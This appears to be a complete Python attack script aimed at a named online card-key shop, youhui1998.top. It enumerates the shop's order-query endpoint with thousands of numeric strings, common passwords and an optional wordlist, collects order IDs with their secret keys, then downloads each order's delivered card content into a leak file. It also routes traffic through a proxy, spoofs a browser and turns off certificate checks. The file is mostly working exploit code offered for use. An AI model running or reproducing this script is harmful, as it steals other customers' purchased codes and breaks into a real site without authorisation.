#!/usr/bin/env python3
"""youhui1998.top query substring export (qd93-style)."""
import json
import os
import re
import sys
import time
from datetime import datetime

import requests

requests.packages.urllib3.disable_warnings()

BASE = "https://youhui1998.top/shop/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120"
OUT_DIR = sys.argv[1] if len(sys.argv) > 1 else f"/data/automation/results/youhui1998.top/scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
DELAY = float(sys.argv[2]) if len(sys.argv) > 2 else 0.2

SHOW = re.compile(r"showOrder\((\d+),\s*['\"]([^'\"]+)['\"]\)")
FAKA = re.compile(r"mod=faka&id=(\d+)&skey=([a-f0-9]{32})")
CARD = re.compile(r"<textarea[^>]*>([^<]+)</textarea>", re.S)


def load_proxy():
    if os.environ.get("PROXY_URL"):
        u = os.environ["PROXY_URL"]
        return {"http": u, "https": u}
    for path in ("/data/config/proxy.env", "/tmp/proxy.env"):
        if os.path.isfile(path):
            for line in open(path):
                if line.startswith("PROXY_URL="):
                    u = line.strip().split("=", 1)[1].strip('"').strip("'")
                    if u:
                        return {"http": u, "https": u}
    return None


def build_queries(orders: int):
    qs = set()
    for i in range(10):
        qs.add(str(i))
    for i in range(100):
        qs.add(f"{i:02d}")
    for i in range(1000):
        qs.add(f"{i:03d}")
    for p in range(130, 200):
        qs.add(str(p))
    for oid in range(max(1, orders - 50), orders + 1):
        qs.add(str(oid))
    extras = [
        "123456", "1234567", "12345678", "123456789", "888888", "666666",
        "000000", "111111", "5201314", "123123", "86", "qq", "test",
        "COM", "sms", "http", "bot", "youhui", "1998", "2026", "202608",
        "20260802", "138", "13", "15", "17", "18",
    ]
    qs.update(extras)
    pwd = os.environ.get("PWD_FILE", "/workspace/query_pwd_list.txt")
    if os.path.isfile(pwd):
        with open(pwd, encoding="utf-8") as f:
            for line in f:
                v = line.strip()
                if v:
                    qs.add(v)
    return sorted(qs, key=lambda x: (len(x), x))


def make_session():
    proxies = load_proxy()
    s = requests.Session()
    s.verify = False
    if proxies:
        s.proxies = proxies
    s.headers.update({"User-Agent": UA, "Referer": BASE})
    return s


def warm(s):
    for attempt in range(6):
        try:
            r = s.get(BASE, timeout=25)
            if len(r.text) > 5000:
                return True
        except Exception as e:
            print(f"warm {attempt}: {e}", flush=True)
            time.sleep(2 + attempt)
    return False


def extract_pairs(html):
    pairs = {}
    for m in SHOW.finditer(html):
        pairs[m.group(1)] = m.group(2)
    for m in FAKA.finditer(html):
        pairs[m.group(1)] = m.group(2)
    return pairs


def fetch_card(s, oid, skey):
    try:
        r = s.get(BASE, params={"mod": "faka", "id": oid, "skey": skey}, timeout=20)
        if "非发卡" in r.text:
            return None
        m = CARD.search(r.text)
        return m.group(1).strip() if m else None
    except Exception:
        return None


def main():
    os.makedirs(OUT_DIR, exist_ok=True)
    log_path = os.path.join(OUT_DIR, "run.log")
    s = make_session()
    if not warm(s):
        print("FAIL warm", flush=True)
        return

    gc = s.get(BASE + "ajax.php?act=getcount", timeout=20)
    orders = int(json.loads(gc.text).get("orders", 0))
    print(f"orders={orders}", flush=True)

    pairs: dict[str, str] = {}
    cards: dict[str, str] = {}
    queries = build_queries(orders)
    print(f"queries={len(queries)}", flush=True)

    for idx, q in enumerate(queries):
        try:
            r = s.get(BASE, params={"mod": "query", "data": q}, timeout=22)
            new = extract_pairs(r.text)
            if new:
                pairs.update(new)
                with open(log_path, "a", encoding="utf-8") as f:
                    f.write(f"HIT {q!r} +{len(new)} total={len(pairs)}\n")
                print(f"HIT {q!r} +{len(new)} total={len(pairs)}", flush=True)
        except Exception as e:
            print(f"err {q}: {e}", flush=True)
        if idx % 100 == 0:
            print(f"progress {idx}/{len(queries)} pairs={len(pairs)}", flush=True)
        time.sleep(DELAY)

    for oid, skey in sorted(pairs.items(), key=lambda x: int(x[0])):
        card = fetch_card(s, oid, skey)
        if card:
            cards[oid] = card
            print(f"CARD {oid} {card[:80]}", flush=True)
        time.sleep(DELAY)

    report = {
        "target": "youhui1998.top",
        "ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "orders": orders,
        "pairs": len(pairs),
        "cards": len(cards),
        "CARD_LEAK": bool(pairs or cards),
    }
    with open(os.path.join(OUT_DIR, "pairs.json"), "w", encoding="utf-8") as f:
        json.dump(pairs, f, ensure_ascii=False, indent=2)
    if cards:
        with open(os.path.join(OUT_DIR, "cards.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(f"{oid}\t{cards[oid]}" for oid in sorted(cards, key=int)))
    with open(os.path.join(OUT_DIR, "report.json"), "w", encoding="utf-8") as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    print("DONE", json.dumps(report, ensure_ascii=False), flush=True)


if __name__ == "__main__":
    main()
